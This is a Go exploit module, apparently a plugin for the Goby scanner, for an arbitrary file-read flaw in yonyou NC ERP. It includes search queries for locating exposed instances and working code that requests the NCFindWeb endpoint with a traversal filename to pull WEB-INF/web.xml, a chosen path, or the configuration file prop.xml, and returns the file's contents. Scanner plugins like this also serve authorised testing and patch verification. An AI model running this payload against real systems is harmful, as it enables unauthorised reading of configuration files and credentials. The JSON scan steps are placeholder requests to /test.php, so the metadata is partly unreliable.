package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou NC NCFindWeb filename file reading vulnerability",
    "Description": "<p>yonyou NC is a large-scale enterprise management and e-commerce platform.</p><p>There is an arbitrary file reading vulnerability in the yonyou NC NCFindWeb path, through which attackers can obtain sensitive files on the website.</p>",
    "Product": "yonyou-ERP-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-08-16",
    "PostTime": "2023-08-16",
    "Author": "forcompass666@gmail.com",
    "FofaQuery": "title=\"产品登录界面\" || ((body=\"/nc/servlet/nc.ui.iufo.login.Index\" || title=\"用友新世纪\") && body!=\"couchdb\") || ((banner=\"nccloud\" && banner=\"Location\" && banner=\"JSESSIONID\") || banner=\"<meta http-equiv=refresh content=0;url=nccloud>\" || (header=\"Path=/nccloud\" && header=\"Set-Cookie: JSESSIONID=\") || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\") || ((((body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\") && body!=\"couchdb\" && body!=\"drupal\") || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (title=\"powered by UFIDA\" && body=\"/activity/testsupport.php\" && title=\"用友\") || (body=\"<a id=\\\"adownload\\\" href=\\\"../Client/Uclient/UClient.exe\\\">\" && body=\"<div class=\\\"substeptxt\\\">降低Java安全级别或添加网址\"))",
    "GobyQuery": "title=\"产品登录界面\" || ((body=\"/nc/servlet/nc.ui.iufo.login.Index\" || title=\"用友新世纪\") && body!=\"couchdb\") || ((banner=\"nccloud\" && banner=\"Location\" && banner=\"JSESSIONID\") || banner=\"<meta http-equiv=refresh content=0;url=nccloud>\" || (header=\"Path=/nccloud\" && header=\"Set-Cookie: JSESSIONID=\") || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\") || ((((body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\") && body!=\"couchdb\" && body!=\"drupal\") || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (title=\"powered by UFIDA\" && body=\"/activity/testsupport.php\" && title=\"用友\") || (body=\"<a id=\\\"adownload\\\" href=\\\"../Client/Uclient/UClient.exe\\\">\" && body=\"<div class=\\\"substeptxt\\\">降低Java安全级别或添加网址\"))",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom,config",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "./",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 NC NCFindWeb filename 文件读取漏洞",
            "Product": "用友-ERP-NC",
            "Description": "<p>用友 NC 是一款大型企业管理与电子商务平台。</p><p>用友 NC NCFindWeb 路径存在任意文件读取漏洞，攻击者通过漏洞可以获取网站敏感文件。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
            "Impact": "<p>攻击者可以利用该漏洞读取重要的系统文件（如数据库配置文件、系统配置文件）、数据库配置文件等，使得网站不安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "yonyou NC NCFindWeb filename file reading vulnerability",
            "Product": "yonyou-ERP-NC",
            "Description": "<p>yonyou NC is a large-scale enterprise management and e-commerce platform.</p><p>There is an arbitrary file reading vulnerability in the yonyou NC NCFindWeb path, through which attackers can obtain sensitive files on the website.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`

	sendPayload9c4aebb2 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/NCFindWeb?service=IPreAlertConfigService&filename=" + filename)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload9c4aebb2(u, "WEB-INF/web.xml")
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "<?xml")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			filePath := goutils.B2S(ss.Params["filePath"])
			if attackType == "config" {
				filePath = `../../ierp/bin/prop.xml`
			}
			rsp, err := sendPayload9c4aebb2(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				if rsp.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
			}
			return expResult
		},
	))
}
